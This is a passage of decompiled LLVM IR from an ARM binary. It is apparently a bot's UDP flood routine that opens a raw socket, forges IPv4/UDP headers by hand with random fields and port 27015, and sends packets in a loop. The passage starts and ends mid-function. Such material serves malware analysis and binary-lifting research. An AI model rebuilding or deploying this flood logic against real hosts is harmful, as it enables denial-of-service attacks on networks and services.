  %v1_d850 = urem i32 %v7_d844, 256
  store i32 %v1_d850, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d85c = load i32, i32* @r4, align 4
  %v0_d860 = load i32, i32* @r5, align 4
  %v5_d868 = inttoptr i32 %v0_d860 to i32*
  %v6_d868 = call i32 @function_a4e8(i32 %v0_d85c, i32* %v5_d868, i32 6, i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1))
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d878 = load i32, i32* @r5, align 4
  store i32 %v6_d868, i32* @r6, align 4
  %v0_d880 = load i32, i32* @r4, align 4
  %v4_d884 = inttoptr i32 %v0_d878 to i32*
  %v5_d884 = call i32 @function_a4e8(i32 %v0_d880, i32* %v4_d884, i32 7, i32 27015)
  store i32 %v5_d884, i32* @r4, align 4
  %v1_d890 = call i32 @function_11c08(i32 29)
  %v3_d89c = call i32 @function_11b24(i32 29, i32* nonnull %stack_var_-44)
  store i32 %v3_d89c, i32* %r8.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d8b0 = call i32 @function_13790(i32 2, i32 3, i32 17)
  %v7_d8b4 = icmp eq i32 %v3_d8b0, -1
  store i1 %v7_d8b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d8b0, i32* %fp.global-to-local, align 4
  br i1 %v7_d8b4, label %dec_label_pc_dc68, label %dec_label_pc_d8c0

dec_label_pc_d8c0:                                ; preds = %dec_label_pc_d7b0
  store i32 1, i32* %stack_var_-40, align 4
  %v6_d8c8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_d8c8, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_d8dc = call i32 @function_13760(i32 %v3_d8b0, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 ptrtoint (i32* @0 to i32))
  %v7_d8e0 = icmp eq i32 %v6_d8dc, -1
  store i1 %v7_d8e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d8e0, label %dec_label_pc_dc60, label %dec_label_pc_d8e8

dec_label_pc_d8e8:                                ; preds = %dec_label_pc_d8c0
  %v0_d8e8 = load i32, i32* @r4, align 4
  %v3_d8e8 = mul i32 %v0_d8e8, 65536
  store i32 %v3_d8e8, i32* @lr, align 4
  %v0_d8ec = load i32, i32* @r7, align 4
  %v0_d8f0 = load i32, i32* @r6, align 4
  %v3_d8f0 = mul i32 %v0_d8f0, 65536
  store i32 %v3_d8f0, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v3_d8f8 = urem i32 %v0_d8ec, 65536
  %v3_d8fc = urem i32 %v0_d8f0, 65536
  store i32 %v3_d8fc, i32* %r2.global-to-local, align 4
  %v3_d900 = urem i32 %v0_d8e8, 65536
  store i32 %v3_d900, i32* %r3.global-to-local, align 4
  %v0_d904 = load i32, i32* %sb.global-to-local, align 4
  %v2_d904 = icmp eq i32 %v0_d904, 0
  store i1 %v2_d904, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %tmp50 = icmp slt i32 %v0_d904, 1
  br i1 %tmp50, label %dec_label_pc_da88, label %dec_label_pc_d91c

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d8e8
  %v1_d920 = urem i32 %v0_d8e8, 256
  %v1_d924 = urem i32 %v0_d8ec, 256
  %v3_d928 = mul nuw nsw i32 %v1_d920, 256
  %v1_d92c = urem i32 %v0_d8f0, 256
  %tmp51 = udiv i32 %v0_d8ec, 256
  %v3_d930 = urem i32 %tmp51, 256
  %tmp52 = udiv i32 %v0_d8f0, 256
  %v3_d934 = urem i32 %tmp52, 256
  store i32 %v3_d934, i32* %ip.global-to-local, align 4
  %v4_d938 = mul nuw nsw i32 %v1_d924, 256
  %v5_d938 = or i32 %v4_d938, %v3_d930
  store i32 %v5_d938, i32* @r7, align 4
  %v4_d93c = mul nuw nsw i32 %v1_d92c, 256
  %v5_d93c = or i32 %v4_d93c, %v3_d934
  store i32 %v5_d93c, i32* @r6, align 4
  %tmp53 = udiv i32 %v0_d8e8, 256
  %v4_d940 = urem i32 %tmp53, 256
  %v5_d940 = or i32 %v4_d940, %v3_d928
  store i32 %v5_d940, i32* @r5, align 4
  store i32 %v1_d92c, i32* %r2.global-to-local, align 4
  store i32 %v1_d920, i32* %r3.global-to-local, align 4
  %v2_d9bc = icmp eq i32 %v1_d850, 0
  %v4_d9c0 = sext i8 %v5_d840 to i32
  %sext = mul i32 %v0_d8ec, 16777216
  %v4_d9dc = sdiv i32 %sext, 16777216
  %sext6 = mul i32 %v0_d8f0, 16777216
  %v4_da38 = sdiv i32 %sext6, 16777216
  %sext7 = mul i32 %v0_d8e8, 16777216
  %v4_da58 = sdiv i32 %sext7, 16777216
  br label %dec_label_pc_d95c

dec_label_pc_d95c:                                ; preds = %bb57, %dec_label_pc_d91c
  %v2_d964 = call i32 @function_13a94(i32 128, i32 1)
  store i32 %v2_d7d0, i32* %r2.global-to-local, align 4
  %v3_d96c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d96c, i32* %r3.global-to-local, align 4
  %v2_d970 = load i32, i32* @r4, align 4
  %v5_d970 = mul i32 %v2_d970, 4
  %v6_d970 = add i32 %v5_d970, %v2_d7d0
  %v7_d970 = inttoptr i32 %v6_d970 to i32*
  store i32 %v2_d964, i32* %v7_d970, align 4
  %v0_d974 = load i32, i32* %r2.global-to-local, align 4
  %v1_d974 = load i32, i32* %r3.global-to-local, align 4
  %v4_d974 = mul i32 %v1_d974, 4
  %v5_d974 = add i32 %v4_d974, %v0_d974
  %v6_d974 = inttoptr i32 %v5_d974 to i32*
  %v7_d974 = load i32, i32* %v6_d974, align 4
  store i32 %v7_d974, i32* @lr, align 4
  %v1_d978 = inttoptr i32 %v7_d974 to i8*
  %v2_d978 = load i8, i8* %v1_d978, align 1
  %tmp = urem i8 %v2_d978, 16
  %v1_d97c = zext i8 %tmp to i32
  %v1_d980 = or i32 %v1_d97c, 64
  store i32 %v1_d980, i32* %r3.global-to-local, align 4
  %v1_d984 = trunc i32 %v1_d980 to i8
  store i8 %v1_d984, i8* %v1_d978, align 1
  %v0_d988 = load i32, i32* @lr, align 4
  %v1_d988 = inttoptr i32 %v0_d988 to i8*
  %v2_d988 = load i8, i8* %v1_d988, align 1
  %v1_d98c = and i8 %v2_d988, -16
  %v1_d990 = or i8 %v1_d98c, 5
  store i8 %v1_d990, i8* %v1_d988, align 1
  %v2_d99c = load i32, i32* @lr, align 4
  %v3_d99c = add i32 %v2_d99c, 1
  %v4_d99c = inttoptr i32 %v3_d99c to i8*
  store i8 %v5_d808, i8* %v4_d99c, align 1
  %v3_d9a0 = load i32, i32* %stack_var_-44, align 4
  %v1_d9a4 = add i32 %v3_d9a0, 32
  %tmp54 = mul i32 %v1_d9a4, 256
  %v1_d9b0 = and i32 %tmp54, 65280
  %tmp55 = udiv i32 %v1_d9a4, 256
  %v4_d9b4 = urem i32 %tmp55, 256
  %v5_d9b4 = or i32 %v4_d9b4, %v1_d9b0
  store i32 %v5_d9b4, i32* %r2.global-to-local, align 4
  store i1 %v2_d9bc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_d9c0, i32* %r3.global-to-local, align 4
  %v2_d9c4 = load i32, i32* @lr, align 4
  %v3_d9c4 = add i32 %v2_d9c4, 8
  %v4_d9c4 = inttoptr i32 %v3_d9c4 to i8*
  store i8 %v5_d840, i8* %v4_d9c4, align 1
  %v0_d9c8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9c8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_d95c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_d9cc = load i32, i32* @lr, align 4
  %v4_d9cc = add i32 %v3_d9cc, 6
  %v5_d9cc = inttoptr i32 %v4_d9cc to i8*
  store i8 64, i8* %v5_d9cc, align 1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_d95c, %bb
  %v0_d9d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d9d0 = trunc i32 %v0_d9d0 to i8
  %v2_d9d0 = load i32, i32* @lr, align 4
  %v3_d9d0 = add i32 %v2_d9d0, 2
  %v4_d9d0 = inttoptr i32 %v3_d9d0 to i8*
  store i8 %v1_d9d0, i8* %v4_d9d0, align 1
  %v0_d9d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d9d4 = sdiv i32 %v0_d9d4, 256
  store i32 %v3_d9d4, i32* %ip.global-to-local, align 4
  store i32 %v4_d9dc, i32* %r2.global-to-local, align 4
  %v2_d9e0 = load i32, i32* @lr, align 4
  %v3_d9e0 = add i32 %v2_d9e0, 9
  %v4_d9e0 = inttoptr i32 %v3_d9e0 to i8*
  store i8 17, i8* %v4_d9e0, align 1
  store i32 ptrtoint (i32* @global_var_1e46c.86 to i32), i32* %r3.global-to-local, align 4
  %v0_d9e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_d9e8 = trunc i32 %v0_d9e8 to i8
  %v2_d9e8 = load i32, i32* @lr, align 4
  %v3_d9e8 = add i32 %v2_d9e8, 5
  %v4_d9e8 = inttoptr i32 %v3_d9e8 to i8*
  store i8 %v1_d9e8, i8* %v4_d9e8, align 1
  %v0_d9ec = load i32, i32* %ip.global-to-local, align 4
  %v1_d9ec = trunc i32 %v0_d9ec to i8
  %v2_d9ec = load i32, i32* @lr, align 4
  %v3_d9ec = add i32 %v2_d9ec, 3
  %v4_d9ec = inttoptr i32 %v3_d9ec to i8*
  store i8 %v1_d9ec, i8* %v4_d9ec, align 1
  %v0_d9f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d9f0, label %.thread8, label %bb56

.thread8:                                         ; preds = %.thread
  %v3_d9f49 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9f49, i32* %ip.global-to-local, align 4
  br label %bb57

bb56:                                             ; preds = %.thread
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d9f4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_d9f4, i32* %ip.global-to-local, align 4
  %v3_d9f8 = load i32, i32* @lr, align 4
  %v4_d9f8 = add i32 %v3_d9f8, 7
  %v5_d9f8 = inttoptr i32 %v4_d9f8 to i8*
  store i8 0, i8* %v5_d9f8, align 1
  %v0_da00.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %bb56
  %v0_da00 = phi i32 [ %v3_d9f49, %.thread8 ], [ %v0_da00.pre, %bb56 ]
  %v2_d9fc = load i32, i32* @global_var_1e46c.86, align 4
  store i32 %v2_d9fc, i32* %r2.global-to-local, align 4
  %v3_da00 = mul i32 %v0_da00, 32
  store i32 %v3_da00, i32* %r3.global-to-local, align 4
  %v1_da04 = load i32, i32* @lr, align 4
  %v2_da04 = add i32 %v1_da04, 12
  %v3_da04 = inttoptr i32 %v2_da04 to i32*
  store i32 %v2_d9fc, i32* %v3_da04, align 4
  %v0_da08 = load i32, i32* %r3.global-to-local, align 4
  %v1_da08 = load i32, i32* %ip.global-to-local, align 4
  %tmp60 = mul i32 %v1_da08, -8
  %v5_da08 = add i32 %v0_da08, %tmp60
  %v1_da0c = load i32, i32* @sl, align 4
  %v2_da0c = add i32 %v5_da08, %v1_da0c
  store i32 %v2_da0c, i32* %r3.global-to-local, align 4
  %v1_da10 = add i32 %v2_da0c, 16
  %v2_da10 = inttoptr i32 %v1_da10 to i32*
  %v3_da10 = load i32, i32* %v2_da10, align 4
  %v1_da14 = load i32, i32* @lr, align 4
  %v2_da14 = add i32 %v1_da14, 16
  %v3_da14 = inttoptr i32 %v2_da14 to i32*
  store i32 %v3_da10, i32* %v3_da14, align 4
  %v3_da18 = load i32, i32* %stack_var_-44, align 4
  %v1_da1c = add i32 %v3_da18, 12
  %tmp58 = mul i32 %v1_da1c, 256
  %v1_da2c = and i32 %tmp58, 65280
  %tmp59 = udiv i32 %v1_da1c, 256
  %v4_da30 = urem i32 %tmp59, 256
  %v5_da30 = or i32 %v4_da30, %v1_da2c
  store i32 %v5_da30, i32* %ip.global-to-local, align 4
  %v1_da34 = load i32, i32* @lr, align 4
  %v2_da34 = add i32 %v1_da34, 28
  %v3_da34 = inttoptr i32 %v2_da34 to i32*
  store i32 -1, i32* %v3_da34, align 4
  store i32 %v4_da38, i32* %r2.global-to-local, align 4
  %v0_da3c = load i32, i32* @lr, align 4
  %v1_da3c = add i32 %v0_da3c, 20
  store i32 %v1_da3c, i32* %r4.global-to-local, align 4
  %v0_da40 = load i32, i32* %ip.global-to-local, align 4
  %v3_da40 = sdiv i32 %v0_da40, 256
  store i32 %v3_da40, i32* %r3.global-to-local, align 4
  %v0_da44 = load i32, i32* @r7, align 4
  %v1_da44 = trunc i32 %v0_da44 to i8
  %v3_da44 = add i32 %v0_da3c, 4
  %v4_da44 = inttoptr i32 %v3_da44 to i8*
  store i8 %v1_da44, i8* %v4_da44, align 1
  %v0_da48 = load i32, i32* @r6, align 4
  %v1_da48 = trunc i32 %v0_da48 to i8
  %v2_da48 = load i32, i32* @lr, align 4
  %v3_da48 = add i32 %v2_da48, 20
  %v4_da48 = inttoptr i32 %v3_da48 to i8*
  store i8 %v1_da48, i8* %v4_da48, align 1
  %v0_da4c = load i32, i32* %r3.global-to-local, align 4
  %v1_da4c = trunc i32 %v0_da4c to i8
  %v2_da4c = load i32, i32* %r4.global-to-local, align 4
  %v3_da4c = add i32 %v2_da4c, 5
  %v4_da4c = inttoptr i32 %v3_da4c to i8*
  store i8 %v1_da4c, i8* %v4_da4c, align 1
  %v0_da50 = load i32, i32* @r5, align 4
  %v1_da50 = trunc i32 %v0_da50 to i8
  %v2_da50 = load i32, i32* %r4.global-to-local, align 4
  %v3_da50 = add i32 %v2_da50, 2
  %v4_da50 = inttoptr i32 %v3_da50 to i8*
  store i8 %v1_da50, i8* %v4_da50, align 1
  %v0_da54 = load i32, i32* %r2.global-to-local, align 4
  %v1_da54 = trunc i32 %v0_da54 to i8
  %v2_da54 = load i32, i32* %r4.global-to-local, align 4
  %v3_da54 = add i32 %v2_da54, 1
  %v4_da54 = inttoptr i32 %v3_da54 to i8*
  store i8 %v1_da54, i8* %v4_da54, align 1
  store i32 %v4_da58, i32* %r3.global-to-local, align 4
  %v0_da5c = load i32, i32* %ip.global-to-local, align 4
  %v1_da5c = trunc i32 %v0_da5c to i8
  %v2_da5c = load i32, i32* %r4.global-to-local, align 4
  %v3_da5c = add i32 %v2_da5c, 4
  %v4_da5c = inttoptr i32 %v3_da5c to i8*
  store i8 %v1_da5c, i8* %v4_da5c, align 1
  %v0_da60 = load i32, i32* %r3.global-to-local, align 4
  %v1_da60 = trunc i32 %v0_da60 to i8
  %v2_da60 = load i32, i32* %r4.global-to-local, align 4
  %v3_da60 = add i32 %v2_da60, 3
  %v4_da60 = inttoptr i32 %v3_da60 to i8*
  store i8 %v1_da60, i8* %v4_da60, align 1
  %v0_da64 = load i32, i32* %r8.global-to-local, align 4
  %v0_da68 = load i32, i32* @lr, align 4
  %v1_da68 = add i32 %v0_da68, 32
  %v3_da6c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_da6c, i32* %r2.global-to-local, align 4
  %v3_da70 = call i32 @function_12558(i32 %v1_da68, i32 %v0_da64, i32 %v3_da6c)
  %v3_da74 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_da74, i32* %r3.global-to-local, align 4
  %v1_da78 = add i32 %v3_da74, 1
  store i32 %v1_da78, i32* @r4, align 4
  %v1_da7c = load i32, i32* %sb.global-to-local, align 4
  %v9_da7c = icmp eq i32 %v1_da78, %v1_da7c
  store i1 %v9_da7c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_da78, i32* %stack_var_-40, align 4
  %v5_da84 = icmp slt i32 %v1_da78, %v1_da7c
  br i1 %v5_da84, label %dec_label_pc_d95c, label %dec_label_pc_da88

dec_label_pc_da88:                                ; preds = %bb57, %dec_label_pc_d8e8
  %v0_da88 = phi i32 [ %v0_d904, %dec_label_pc_d8e8 ], [ %v1_da7c, %bb57 ]
  %v2_da88 = icmp eq i32 %v0_da88, 0
  store i1 %v2_da88, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v9_dad0 = icmp eq i32 %v3_d8f8, add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1)
  br label %dec_label_pc_da90.outer

dec_label_pc_da90.outer:                          ; preds = %dec_label_pc_dba0, %dec_label_pc_da88
  %v1_da90.ph.in = phi i32 [ %v1_db94, %dec_label_pc_dba0 ], [ %v0_da88, %dec_label_pc_da88 ]
  %v0_da90.ph = phi i1 [ %v2_dba0, %dec_label_pc_dba0 ], [ %v2_da88, %dec_label_pc_da88 ]
  %v1_da90.ph = icmp slt i32 %v1_da90.ph.in, 0
  %v4_da90 = or i1 %v1_da90.ph, %v0_da90.ph
  br label %dec_label_pc_da90

dec_label_pc_da90:                                ; preds = %dec_label_pc_da90.outer, %dec_label_pc_da90
  br i1 %v4_da90, label %dec_label_pc_da90, label %dec_label_pc_da94

dec_label_pc_da94:                                ; preds = %dec_label_pc_da90
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_daa0

dec_label_pc_daa0:                                ; preds = %dec_label_pc_daf0, %dec_label_pc_da94
  %v1_dab4 = phi i32 [ %v1_db90, %dec_label_pc_daf0 ], [ 0, %dec_label_pc_da94 ]
  %v5_daa4 = mul i32 %v1_dab4, 24
  %v1_daa8 = load i32, i32* @sl, align 4
  %v2_daa8 = add i32 %v1_daa8, %v5_daa4
  store i32 %v2_daa8, i32* %r3.global-to-local, align 4
  %v1_dab0 = add i32 %v2_daa8, 20
  %v2_dab0 = inttoptr i32 %v1_dab0 to i8*
  %v3_dab0 = load i8, i8* %v2_dab0, align 1
  %v4_dab0 = zext i8 %v3_dab0 to i32
  store i32 %v4_dab0, i32* %r2.global-to-local, align 4
  %v4_dab4 = mul i32 %v1_dab4, 4
  %v5_dab4 = add i32 %v4_dab4, %v2_d7d0
  %v6_dab4 = inttoptr i32 %v5_dab4 to i32*
  %v7_dab4 = load i32, i32* %v6_dab4, align 4
  store i32 %v7_dab4, i32* @r5, align 4
  %v7_dabc = icmp eq i8 %v3_dab0, 31
  store i1 %v7_dabc, i1* %cpsr_z.global-to-local, align 1
  store i32 add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), i32* %r7.global-to-local, align 4
  %v1_dac4 = add i32 %v7_dab4, 20
  store i32 %v1_dac4, i32* @r6, align 4
  %tmp61 = icmp ult i8 %v3_dab0, 32
  br i1 %tmp61, label %dec_label_pc_dbac, label %dec_label_pc_dacc

dec_label_pc_dacc:                                ; preds = %dec_label_pc_daa0
  store i32 %v3_d8f8, i32* %r2.global-to-local, align 4
  store i1 %v9_dad0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dad0, label %dec_label_pc_dc14, label %dec_label_pc_dad8

dec_label_pc_dad8:                                ; preds = %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge, %dec_label_pc_dacc
  %v1_dadc = phi i32 [ %v1_dadc.pre, %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_10000.26 to i32), i32 -1), %dec_label_pc_dacc ]
  store i32 %v3_d8fc, i32* %r3.global-to-local, align 4
  %v9_dadc = icmp eq i32 %v3_d8fc, %v1_dadc
  store i1 %v9_dadc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dadc, label %dec_label_pc_dc30, label %dec_label_pc_dae4

dec_label_pc_dae4:                                ; preds = %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge, %dec_label_pc_dad8
  %v1_dae8 = phi i32 [ %v1_dae8.pre, %dec_label_pc_dc14.dec_label_pc_dae4_crit_edge ], [ %v1_dadc, %dec_label_pc_dad8 ]
  %v9_dae8 = icmp eq i32 %v3_d900, %v1_dae8
  store i1 %v9_dae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_dae8, label %dec_label_pc_dc4c, label %dec_label_pc_daf0

dec_label_pc_daf0:                                ; preds = %dec_label_pc_dc30, %dec_label_pc_dae4, %dec_label_pc_dc4c
  %v0_daf4 = load i32, i32* %r8.global-to-local, align 4
  %v1_daf4 = trunc i32 %v0_daf4 to i8
  %v2_daf4 = load i32, i32* @r5, align 4
  %v3_daf4 = add i32 %v2_daf4, 10
  %v4_daf4 = inttoptr i32 %v3_daf4 to i8*
  store i8 %v1_daf4, i8* %v4_daf4, align 1
  %v0_daf8 = load i32, i32* %r8.global-to-local, align 4
  %v1_daf8 = trunc i32 %v0_daf8 to i8
  %v2_daf8 = load i32, i32* @r5, align 4
  %v3_daf8 = add i32 %v2_daf8, 11
  %v4_daf8 = inttoptr i32 %v3_daf8 to i8*
  store i8 %v1_daf8, i8* %v4_daf8, align 1
  %v0_dafc = load i32, i32* @r5, align 4
  store i32 %v0_dafc, i32* @r0, align 4
  %v2_db00 = call i32 @function_e424(i32 %v0_dafc, i32 20)
  %v3_db00 = trunc i32 %v2_db00 to i8
  %v4_db04 = sdiv i32 %v2_db00, 256
  store i32 %v4_db04, i32* %r3.global-to-local, align 4
  %v1_db08 = trunc i32 %v4_db04 to i8
  %v2_db08 = load i32, i32* @r5, align 4
  %v3_db08 = add i32 %v2_db08, 11
  %v4_db08 = inttoptr i32 %v3_db08 to i8*
  store i8 %v1_db08, i8* %v4_db08, align 1
  %v3_db0c = load i32, i32* @r5, align 4
  %v4_db0c = add i32 %v3_db0c, 10
  %v5_db0c = inttoptr i32 %v4_db0c to i8*
  store i8 %v3_db00, i8* %v5_db0c, align 1
  %v0_db10 = load i32, i32* %r8.global-to-local, align 4
  %v1_db10 = trunc i32 %v0_db10 to i8
  %v2_db10 = load i32, i32* @r6, align 4
  %v3_db10 = add i32 %v2_db10, 6
  %v4_db10 = inttoptr i32 %v3_db10 to i8*
  store i8 %v1_db10, i8* %v4_db10, align 1
  %v0_db14 = load i32, i32* %r8.global-to-local, align 4
  %v1_db14 = trunc i32 %v0_db14 to i8
  %v2_db14 = load i32, i32* @r6, align 4
  %v3_db14 = add i32 %v2_db14, 7
  %v4_db14 = inttoptr i32 %v3_db14 to i8*
  store i8 %v1_db14, i8* %v4_db14, align 1
  %v0_db18 = load i32, i32* @r5, align 4
  %v1_db18 = add i32 %v0_db18, 24
  %v2_db18 = inttoptr i32 %v1_db18 to i8*
  %v3_db18 = load i8, i8* %v2_db18, align 1
  %v4_db18 = zext i8 %v3_db18 to i32
  store i32 %v4_db18, i32* %r3.global-to-local, align 4
  %v1_db1c = add i32 %v0_db18, 25
  %v2_db1c = inttoptr i32 %v1_db1c to i8*
  %v3_db1c = load i8, i8* %v2_db1c, align 1
  %v4_db1c = zext i8 %v3_db1c to i32
  %v4_db20 = mul nuw nsw i32 %v4_db1c, 256
  %v5_db20 = or i32 %v4_db20, %v4_db18
  store i32 %v5_db20, i32* %r2.global-to-local, align 4
  %v3_db24 = load i32, i32* %stack_var_-44, align 4
  %v0_db28 = load i32, i32* @r6, align 4
  store i32 %v0_db28, i32* @r1, align 4
  %v1_db2c = add i32 %v3_db24, 12
  store i32 %v1_db2c, i32* %r3.global-to-local, align 4
  %v4_db34 = call i32 @function_e480(i32 %v0_db18, i32 %v0_db28, i32 %v5_db20, i32 %v1_db2c)
  %v5_db34 = trunc i32 %v4_db34 to i8
  %v4_db3824 = udiv i32 %v4_db34, 256
  %v1_db3c = trunc i32 %v4_db3824 to i8
  %v2_db3c = load i32, i32* @r6, align 4
  %v3_db3c = add i32 %v2_db3c, 7
  %v4_db3c = inttoptr i32 %v3_db3c to i8*
  store i8 %v1_db3c, i8* %v4_db3c, align 1
  %v3_db40 = load i32, i32* @r6, align 4
  %v4_db40 = add i32 %v3_db40, 6
  %v5_db40 = inttoptr i32 %v4_db40 to i8*
  store i8 %v5_db34, i8* %v5_db40, align 1
  %v3_db44 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_db44, i32* %r3.global-to-local, align 4
  %v0_db48 = load i32, i32* @r5, align 4
  %v1_db48 = add i32 %v0_db48, 20
  %v2_db48 = inttoptr i32 %v1_db48 to i32*
  %v3_db48 = load i32, i32* %v2_db48, align 4
  %v5_db50 = mul i32 %v3_db44, 24
  %v1_db54 = load i32, i32* @sl, align 4
  %v2_db54 = add i32 %v1_db54, %v5_db50
  store i32 %v2_db54, i32* %ip.global-to-local, align 4
  %v3_db58 = udiv i32 %v3_db48, 65536
  store i32 %v3_db58, i32* %r2.global-to-local, align 4
  %v1_db5c = trunc i32 %v3_db58 to i8
  %v3_db5c = add i32 %v2_db54, 2
  %v4_db5c = inttoptr i32 %v3_db5c to i8*
  store i8 %v1_db5c, i8* %v4_db5c, align 1
  %v0_db60 = load i32, i32* %r2.global-to-local, align 4
  %v3_db6025 = udiv i32 %v0_db60, 256
  %v3_db64 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_db64, i32* %r2.global-to-local, align 4
  %v1_db68 = trunc i32 %v3_db6025 to i8
  %v2_db68 = load i32, i32* %ip.global-to-local, align 4
  %v3_db68 = add i32 %v2_db68, 3
  %v4_db68 = inttoptr i32 %v3_db68 to i8*
  store i8 %v1_db68, i8* %v4_db68, align 1
  %v0_db6c = load i32, i32* @r5, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_db74 = load i32, i32* %r2.global-to-local, align 4
  %v1_db74 = add i32 %v0_db74, 32
  store i32 %v1_db74, i32* %r2.global-to-local, align 4
  %v0_db78 = load i32, i32* %fp.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_db80 = load i32, i32* %ip.global-to-local, align 4
  %v6_db88 = inttoptr i32 %v0_db6c to i32*
  %v7_db88 = call i32 @function_1372c(i32 %v0_db78, i32* %v6_db88, i32 %v1_db74, i32 16384, i32 %v0_db80, i32 16)
  %v3_db8c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_db8c, i32* %r3.global-to-local, align 4
  %v1_db90 = add i32 %v3_db8c, 1
  %v1_db94 = load i32, i32* %sb.global-to-local, align 4
  %v9_db94 = icmp eq i32 %v1_db90, %v1_db94
  store i1 %v9_db94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_db90, i32* %stack_var_-40, align 4
  %v5_db9c = icmp slt i32 %v1_db90, %v1_db94
  br i1 %v5_db9c, label %dec_label_pc_daa0, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_daf0
  %v2_dba0 = icmp eq i32 %v1_db94, 0
  store i1 %v2_dba0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_da90.outer

dec_label_pc_dbac:                                ; preds = %dec_label_pc_daa0
  %v1_dbac = add i32 %v2_daa8, 16
  %v2_dbac = inttoptr i32 %v1_dbac to i32*
  %v3_dbac = load i32, i32* %v2_dbac, align 4
  store i32 %v3_dbac, i32* @r4, align 4
  %v0_dbb0 = call i32 @function_fe24()
  %v3_dbb4 = load i32, i32* %stack_var_-40, align 4
  %v5_dbbc = mul i32 %v3_dbb4, 24
  %v0_dbc0 = load i32, i32* @r4, align 4
  %v1_dbc4 = and i32 %v0_dbc0, 65280
  store i32 %v1_dbc4, i32* %r3.global-to-local, align 4
  %v1_dbc0 = udiv i32 %v0_dbc0, 256
  %v3_dbc8 = and i32 %v1_dbc0, 65280
  store i32 %v3_dbc8, i32* %r2.global-to-local, align 4
  %v1_dbcc = load i32, i32* @sl, align 4
  %v2_dbcc = add i32 %v1_dbcc, %v5_dbbc
  store i32 %v2_dbcc, i32* %ip.global-to-local, align 4
  %v1_dbd8 = add i32 %v2_dbcc, 20
  %v2_dbd8 = inttoptr i32 %v1_dbd8 to i8*
  %v3_dbd8 = load i8, i8* %v2_dbd8, align 1
  %v4_dbd8 = zext i8 %v3_dbd8 to i32
  %v2_dbe0 = call i32 @llvm.bswap.i32(i32 %v0_dbc0)
  %v7_dbe4 = lshr i32 %v0_dbb0, %v4_dbd8
  %v8_dbe4 = add i32 %v7_dbe4, %v2_dbe0
  store i32 %v3_d8f8, i32* %r2.global-to-local, align 4
  %v2_dc04 = call i32 @llvm.bswap.i32(i32 %v8_dbe4)
  store i32 %v2_dc04, i32* %r3.global-to-local, align 4
  %v1_dc08 = load i32, i32* %r7.global-to-local, align 4
  %v9_dc08 = icmp eq i32 %v3_d8f8, %v1_dc08
  store i1 %v9_dc08, i1* %cpsr_z.global-to-local, align 1
  %v1_dc0c = load i32, i32* @r5, align 4
  %v2_dc0c = add i32 %v1_dc0c, 16
  %v3_dc0c = inttoptr i32 %v2_dc0c to i32*
  store i32 %v2_dc04, i32* %v3_dc0c, align 4
  br i1 %v9_dc08, label %dec_label_pc_dc14, label %dec_label_pc_dbac.dec_label_pc_dad8_crit_edge

dec_label_pc_dbac.dec_label_pc_dad8_crit_edge:    ; preds = %dec_label_pc_dbac
  %v1_dadc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_dad8

dec_label_pc_dc14:                                ; preds = %dec_label_pc_dbac, %dec_label_pc_dacc
  %v0_dc14 = call i32 @function_fe24()
  %v1_dc14 = trunc i32 %v0_dc14 to i8
  %v4_dc1826 = udiv i32 %v0_dc14, 256
  %v1_dc1c = trunc i32 %v4_dc1826 to i8
  %v2_dc1c = load i32, i32* @r5, align 4
  %v3_dc1c = add i32 %v2_dc1c, 5
